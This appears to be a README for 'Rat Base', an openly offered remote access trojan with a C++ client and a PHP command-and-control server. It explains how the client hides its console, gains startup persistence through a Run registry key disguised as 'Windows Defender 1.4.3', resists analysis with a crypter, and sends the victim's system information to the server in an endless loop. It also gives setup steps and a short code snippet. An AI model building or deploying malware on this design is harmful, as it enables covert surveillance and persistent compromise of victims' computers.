# Rat Base
A basic base for a Remote. Access. Tool. written in native C++ and PHP.

# Usage
This RAT is not like most others it sends a GET request with all its data split by `|` to a API.
This RAT is primarily made for recon as it doesn't provide any post-exploitation modules but that might be added in the feature as well as a frontend.
You should launch this server on a nginx or apache2 server with PHP installed.
Then compile the client with updated CNC IPv4, and Port.

# How does it work?
In the first line of the client it free's console so it's hidden (obviously)
then it creates registry values in `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` called `Windows Defender 1.4.3` to infect it to startup.
using RCrypter to make it very hard to debug and analyze on runtime-
It then creates a loop that is going to run forever (well not forever since it's uncertain but you know what I mean) where it then gets PC info and pushes it to db
```cpp
PCInfo* LocalPC;

	while (true) {
		LocalPC = new PCInfo(); // Makes new instance of the computers info

		LocalPC->PushData(); // Pushes PC data to web-server

		Sleep(1000);
	}
```

# Why?
This project was for me to see if i could make one with clean and code.


